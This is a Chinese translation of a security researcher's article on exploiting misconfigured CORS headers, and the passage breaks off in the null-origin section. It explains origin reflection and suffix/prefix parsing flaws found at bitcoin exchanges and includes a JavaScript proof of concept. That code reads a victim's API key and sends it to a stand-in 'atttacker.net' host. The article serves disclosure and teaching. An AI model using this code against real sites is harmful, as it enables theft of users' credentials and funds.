原文地址：
在本文中，我将展示如何识别和利用配置错误的CORS。本文内容摘自AppSec
USA大会上的演讲内容，并做了相应的提炼。如果您的时间比较充裕(或阅读本文时遇到了难以理解的内容)的话，我强烈建议您查看相关的[幻灯片](https://portswigger.net/knowledgebase/papers/itingcorsmisconfigurations.pdf)并观看[相关视频](https://www.youtube.com/watch?v=wgkj4ZgxI4c&list=PLpr-xdpM8wG8RHOguwOZhUHkKiDeWpvFp&index=31)。
#### What is CORS? (Cross Origin Resource Sharing)
跨域资源共享([CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS))是这样一种技术，网站可以通过它来降低浏览器的同源策略的严格程度，从而实现不同网站之间的跨域通信。过去，该技术经常被Web
API使用，但在现代复杂的网站中，也经常看到它的身影。众所周知，某些CORS配置一旦失误，是带来严重的后果；与此同时，与该配置相关的许多细节及其具体含义很容易被误解。在这篇文章中，我将为读者介绍黑客如何考察CORS的配置失误，并利用这些失误来窃取比特币的。
#### CORS for hackers
我们知道，网站可以通过发送如下所示的HTTP响应头部来启用CORS机制：
    Access-Control-Allow-Origin: https://example.com
这实际上就是允许上面指定的源（域）通过用户的浏览器中向其他服务器发送跨域请求并读取响应——而正常情况下，[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)会阻止这些请求。默认情况下，发送这些请求时是不会携带用户的cookie或其他凭证的，因此，攻击者无法窃取用户的敏感信息（如CSRF令牌）。不过，服务器也可以使用如下所示的头部来启用凭证传输机制：
    Access-Control-Allow-Credentials: true
这就建立了信任关系——因此，如果example.com存在XSS漏洞，那么漏洞的影响将会扩散。
#### Hidden in plain sight
如上所示，在信任单个源的情况下，还是很容易指定的。然而，如果我们需要信任多个源的话，那该怎么办呢？按照相关规范的建议，我们只需将其放人一个以空格分隔的列表中即可，例如：
    Access-Control-Allow-Origin: http://foo.com http://bar.net
然而，没有浏览器真正支持这种做法。
有时候，我们想要利用通配符来指定信任的所有子域，例如：
    Access-Control-Allow-Origin: *.portswigger.net
但这也行不通。因为这里要么给出一个完整的域名，要么只给出单个通配符`*`——表示允许任意域名。
实际上，CORS自身也提供了一个隐藏的安全措施。如果您想完全禁用SOP并将自己的网站"暴露"给所有人，可以使用下面的头部组合：
    Access-Control-Allow-Origin: *\
    Access-Control-Allow-Credentials: true
这样的话，我们就会在浏览器控制台中收到以下错误消息：
> Cannot use wildcard in Access-Control-Allow-Origin when credentials flag is
> true.（即当凭据标志为true时，在Access-Control-Allow-Origin中不能使用通配符。）
实际上，相关规范中提到了这个异常，并且[Mozilla的文档支持](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Requests_with_credentials)也有所述及：
> 在响应凭证请求时，服务器必须指定域，并且不能使用通配符
换句话说，使用通配符可以有效地禁用Allow-Credentials头部。
由于这些限制，许多服务器以编程方式根据用户提供的Origin值来生成`Access-Control-Allow-Origin`头部。这是最常见的一种CORS漏洞。当我们发现HTTP响应带有任何`Access-Control-*`头部却未声明域的时候，这就表明服务器将根据我们的输入来生成头部。其他服务器只有在收到包含Origin头部的请求时才会发送CORS头部，这使得相关的漏洞非常容易被遗漏。
#### Credentials and bitcoins
因此，许多网站都是从用户输入中获得允许跨域访问的域名的。那么，这会不会导致安全隐患呢？于是，我决定评估一些漏洞赏金网站并从中寻找答案。请注意，虽然这些网站都提供了漏洞赏金计划，但是，前面提到的漏洞还是被许多赏金猎人所遗漏了。我很快就复现了
[Evan Johnson's finding](http://ejj.io/misconfigured-cors/)
的发现，即许多应用程序在做出响应之前，并没有对源进行检查，同时，我还找到了一个易受攻击的比特币交易所（遗憾的是，该交易所不愿意公开其名称）：
    GET /api/requestApiKey HTTP/1.1\
    Host: \
    Origin: https://fiddle.jshell.net\
    Cookie: sessionid=...
    HTTP/1.1 200 OK\
    Access-Control-Allow-Origin: https://fiddle.jshell.net\
    Access-Control-Allow-Credentials: true
    {"[private API key]"}
与此同时，我还建立了一POC代码，用于证明窃取用户的私有API密钥是一件多么轻而易举的事情：
    var req = new XMLHttpRequest();\
    req.onload = reqListener;\
    req.open('get','https://btc-exchange/api/requestApiKey',true);\
    req.withCredentials = true;\
    req.send();
    function reqListener() {\
        location='//atttacker.net/log?key='+this.responseText;\
    };
在获取用户的API密钥后，我就可以禁用帐户的通知功能，并启用2FA以将其锁定，这样就可以将其比特币转移到任意地址。由此看来，头部配置错误是一种非常严重的安全漏洞。当然，我还是克制住了将比特币收入囊中并跑路的冲动，并向该交易所提交了该漏洞，之后，他们仅用了20分钟就修复了该漏洞。
此外，对于某些网站来说，当对源进行验证以确定是否应该信任它时，常常会遇到经典的URL解析错误。例如，有一个网站（不妨称之为advisor.com）完全信任以`advisor.com`结尾的所有域名，包括`definitelynotadvisor.com`。更糟糕的是，第二个比特币交易所（我们称之为btc.net）信任所有以`https://btc.net`开头的域名，包括`https://btc.net.evil.net`。不幸的是，我还没有来得及构建POC，这个网站就突然关闭了，至于具体原因，我也不清楚。
#### The null origin
如果您对上面的内容非常关心的话，很可能想知道什么情况下[`Origin`的值为`null`](https://www.w3.org/TR/cors/#access-control-allow-origin-response-header)。按照相关规范的说法，重定向会触发这种情况，此外，根据stackoverflow上的某些帖子来看，本地HTML文件也可能导致这种情况。也许是由于这种情况与本地文件有关，我发现有许多的网站都将其列入了白名单，其中包括Google的PDF阅读器：
    GET /reader?url=zxcvbn.pdf\
    Host: docs.google.com\
    Origin: null
    HTTP/1.1 200 OK\
    Acess-Control-Allow-Origin: null\
    Access-Control-Allow-Credentials: true
此外，该问题还涉及第三方比特币交易所。这对攻击者来说再好不过了，因为任何网站都可以通过沙箱化的`iframe`来轻松获得值为`null`的Obtain头部: